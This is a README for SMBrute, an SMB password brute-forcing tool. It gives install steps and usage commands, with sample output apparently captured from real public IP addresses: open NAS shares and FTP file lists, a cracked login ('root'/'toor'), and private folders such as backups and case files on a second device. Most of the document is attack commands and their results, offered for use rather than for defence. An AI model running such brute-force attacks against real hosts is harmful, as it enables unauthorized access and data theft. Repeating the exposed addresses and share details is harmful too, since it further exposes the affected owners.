# SMBrute v0.1.0
SMBrute is a program that can be used to bruteforce username and passwords of servers that are using SMB (Samba).

![screen](https://raw.githubusercontent.com/m4ll0k/SMBrute/master/screen.png)

## Install SMBrute

```
$ git clone https://github.com/m4ll0k/SMBrute.git smbrute
$ cd smbrute
$ pip3 install pysmb humanfriendly
$ python3 smbrute.py
```

## Usage:

```
$ python3 smbrute.py -h 188.10.73.147
```
```
 _____ _____ _____         _       
|   __|     | __  |___ _ _| |_ ___ 
|__   | | | | __ -|  _| | |  _| -_|
|_____|_|_|_|_____|_| |___|_| |___|

SMBrute - SMB Protocol Bruteforce
	Version 0.1.0
    Momo Outaadi (M4ll0k)

----------------------------------------
[+] Host 188.10.73.147 authentication disabled
[+] Showing folders..
------------------------------------------------
| Name       | Type | Comments                 |
------------------------------------------------
| Multimedia |    0 | System default share     |
| Download   |    0 | System default share     |
| Recordings |    0 | System default share     |
| Web        |    0 | System default share     |
| Public     |    0 | System default share     |
| homes      |    0 | System default share     |
| Archivio   |    0 |                          |
| FTP        |    0 | ftp                      |
| home       |    0 | Home                     |
| Qsync      |    0 | Qsync                    |
| IPC$       |    3 | IPC Service (NAS Server) |
------------------------------------------------
```
__Show Files:__

```
$ python3 smbrute.py -h 188.10.73.147 -f FTP
```

```
_____ _____ _____         _       
|   __|     | __  |___ _ _| |_ ___ 
|__   | | | | __ -|  _| | |  _| -_|
|_____|_|_|_|_____|_| |___|_| |___|

SMBrute - SMB Protocol Bruteforce
	Version 0.1.0
    Momo Outaadi (M4ll0k)

----------------------------------------
[+] Host 188.10.73.147 authentication disabled
[+] Show FTP Files...
-----------------------------------------------------------
| Filename                                     | ReadOnly |
-----------------------------------------------------------
| .                                            | False    |
| ..                                           | False    |
| mLog_27_8_17__23_00_01.csv                   | False    |
| mLog_26_1_18__23_00_01.csv                   | False    |
| mLog_23_1_18__23_00_01.csv                   | False    |
| mLog_28_3_17__23_00_01.csv                   | False    |
| mLog_21_6_17__23_00_01.csv                   | False    |
-----------------------------------------------------------
```
__Bruteforce Login:__
```
$ python3 smbrute.py -h 2.35.69.44
```
```
 _____ _____ _____         _       
|   __|     | __  |___ _ _| |_ ___ 
|__   | | | | __ -|  _| | |  _| -_|
|_____|_|_|_|_____|_| |___|_| |___|

SMBrute - SMB Protocol Bruteforce
	Version 0.1.0
    Momo Outaadi (M4ll0k)

----------------------------------------
[-] Host 2.35.69.44 authentication enabled
[!] Please set wordlist for bruteforcing

```
```
$ python3 smbrute.py -h 2.35.69.44 -U user.txt -P pass.txt -t 10
```

```
 _____ _____ _____         _       
|   __|     | __  |___ _ _| |_ ___ 
|__   | | | | __ -|  _| | |  _| -_|
|_____|_|_|_|_____|_| |___|_| |___|

SMBrute - SMB Protocol Bruteforce
	Version 0.1.0
    Momo Outaadi (M4ll0k)

----------------------------------------
[-] Host 2.35.69.44 authentication enabled
[+] Start bruteforcing...
[+] Username: root Password: toor
```
__After found credentials:__
```
$ python3 smbrute.py -h 2.35.69.44 -u admin -p 1234
```
```
 _____ _____ _____         _       
|   __|     | __  |___ _ _| |_ ___ 
|__   | | | | __ -|  _| | |  _| -_|
|_____|_|_|_|_____|_| |___|_| |___|

SMBrute - SMB Protocol Bruteforce
	Version 0.1.0
    Momo Outaadi (M4ll0k)

----------------------------------------
[+] Host 2.35.69.44 authentication disabled
[+] Showing folders..
-----------------------------------------------------------------
| Name                   | Type | Comments                      |
-----------------------------------------------------------------
| IPC$                   |    3 | IPC Service (WDMyCloudEX2100) |
| Recycle Bin - Volume_1 |    0 | Recycle Bin Directories       |
| serverconf             |    0 |                               |
| deleghe2               |    0 |                               |
| prova                  |    0 |                               |
| ebcs_site              |    0 |                               |
| deleghe                |    0 |                               |
| confcatania2           |    0 |                               |
| backup                 |    0 |                               |
| doc                    |    0 | doc                           |
| ebcs                   |    0 | ebcs                          |
| foto                   |    0 | foto                          |
| pratiche               |    0 |                               |
| TimeMachineBackup      |    0 |                               |
| SmartWare              |    0 |                               |
| Public                 |    0 |                               |
-----------------------------------------------------------------
```
